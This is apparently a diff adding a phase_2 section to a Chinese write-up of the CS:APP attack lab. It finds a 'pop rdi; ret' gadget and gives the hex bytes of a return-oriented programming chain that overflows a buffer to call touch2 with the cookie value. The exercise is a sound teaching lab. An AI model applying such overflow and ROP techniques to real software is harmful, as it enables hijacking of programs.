@@ -40,3 +40,34 @@ $1 = {void ()} 0x4017c0 <touch1>
 前面这些a的十六进制表示我是拿010生成的，后面再手动补上小端存储的touch1地址
 然后执行程序完成本次实验
 ![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image1.png)
+
+## phase_2
+touch2源代码
+```
+1 void touch2(unsigned val)
+2 {
+3 vlevel = 2; /* Part of validation protocol */
+4 if (val == cookie) {
+5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
+6 validate(2);
+7 } else {
+8 printf("Misfire: You called touch2(0x%.8x)\n", val);
+9 fail(2);
+10 }
+11 exit(0);
+12 }
+```
+程序要求我们令val的值等于我们的cookie值才能通过，而val则是作为函数的第一个参数传入，也就是说只要让rdi寄存器的值等于cookie就可以了
+使用ROPgadget找到如下gadget
+```
+0x000000000040141b : pop rdi ; ret
+```
+然后构造ROP链如下所示
+```
+fa 97 b9 59 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 1b 14 40 00 00 00 00 00 
+fa 97 b9 59 00 00 00 00 ec 17 40 00 00 00 00 00
+```
+完成phase_2
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image2.png)
